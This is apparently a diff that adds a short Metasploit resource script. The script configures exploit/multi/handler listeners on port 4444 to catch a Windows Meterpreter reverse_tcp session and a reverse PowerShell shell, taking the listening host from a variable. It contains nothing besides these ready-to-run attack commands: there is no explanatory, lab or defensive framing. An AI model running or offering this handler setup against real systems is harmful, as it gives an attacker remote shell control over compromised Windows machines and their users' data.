@@ -1,0 +1,10 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost $lhost
+set lport 4444
+exploit
+background
+set payload cmd/windows/reverse_powershell
+set lhost $lhost
+set lport 4444
+exploit
